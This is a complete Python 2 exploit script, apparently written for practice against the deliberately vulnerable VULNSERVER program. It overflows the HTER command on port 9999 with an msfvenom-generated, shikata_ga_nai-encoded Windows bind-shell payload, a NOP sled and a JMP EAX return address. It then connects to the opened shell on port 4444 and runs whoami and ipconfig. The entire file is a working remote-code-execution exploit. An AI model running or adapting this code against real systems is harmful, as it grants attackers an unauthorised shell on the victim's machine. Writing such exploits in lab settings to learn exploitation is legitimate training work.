#!/usr/bin/python
import socket
import os
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host= sys.argv[1]
port=9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)

# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00" EXITFUNC=thread -f hex
shellcode = "d9c4d97424f4bf8d60f1bd5831c9b15383c00431781303f5731348f99c51b3015d363de46c76596dde462923d32d7fd76043a8d8c1ee8ed7d243f276519e275868513a99ad8cb7cb66da6afb0396b6705f36bf652839ee38226030bbe71879a3e4253358ded2c2882e1a68f59ee970321812074a5aaf1089206b940982f80ef5322cc87e38999ed85d1c7253599575b3ebed5117b7b6f80e1d180450fec5a01b1311d9467cd6d0787c70620b4edfd883e2a8c6540483bfcafb2cc0c33f78907be9017b7b16d41673b187047e017889d0ea92060f0a9dcc38a360ef5768ec093d80b882a9629f1a4e9cf532f8d51f8407e635a29f6d5a76be7177ded7e60d8f9a97129a4c3b80418c32b9dddb130f148989368eaf53aee96b8813f7725d2fd3649bb05fd073e7098e3551f878ec0e52ec697d656a76a81392c70562ade8c162d614728c0d9d926f87e83a36425127c9b9965e4a4b67a5523e62e1d4d31e7ab1d38d7b90"
nops = "90" * 16
align_stack = "505c"

A   = align_stack + nops + shellcode + "41" * ((2040 - (len(shellcode) + len(nops) + len(align_stack))) / 2 )

# 625011B1   FFE0             JMP EAX
EIP = "B1115062"
C   = "43" * (5000 -len(A) - len(EIP))

buffer = "HTER ." + A + EIP + C
print "[+] Sending exploit buffer"
s.send(buffer)

print "[+] Waiting for shell."
time.sleep(2)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
